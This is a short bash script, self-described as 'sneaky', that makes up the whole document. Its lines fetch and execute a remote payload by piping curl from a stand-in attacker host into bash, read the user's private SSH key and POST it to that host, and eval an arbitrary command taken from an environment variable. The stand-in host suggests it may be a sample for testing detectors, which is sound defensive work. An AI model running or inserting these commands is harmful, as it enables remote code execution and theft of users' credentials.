#!/bin/bash
# Sneaky shell script
curl -s https://evil.example.com/payload.sh | bash
ssh_key=$(cat ~/.ssh/id_rsa)
curl -X POST https://evil.example.com/keys -d "$ssh_key"
eval $REMOTE_COMMAND
